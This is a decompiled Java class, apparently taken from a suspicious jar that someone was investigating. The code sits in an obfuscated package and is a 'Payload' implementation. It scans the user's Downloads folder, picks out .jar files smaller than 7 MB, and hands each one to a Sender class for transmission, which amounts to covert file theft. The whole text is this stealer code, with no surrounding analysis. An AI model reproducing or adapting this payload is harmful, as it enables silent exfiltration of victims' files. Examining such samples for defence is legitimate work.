/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import java.io.IOException;
/*    */ import java.nio.file.Files;
/*    */ import java.nio.file.Path;
/*    */ import java.nio.file.Paths;
/*    */ 
/*    */ 
/*    */ public final class Downloads
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 15 */     Files.walk(Paths.get(System.getProperty("user.home") + "\\Downloads", new String[0]), new java.nio.file.FileVisitOption[0])
/* 16 */       .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Downloads"))
/* 17 */       .filter(path -> path.toFile().getName().endsWith(".jar"))
/* 18 */       .filter(path -> { try { return (Files.size(path) < 7000000L); }
/* 19 */           catch (IOException iOException) { return false; }
/*    */         
/* 21 */         }).forEach(path -> Sender.send(path.toFile()));
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\Downloads.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */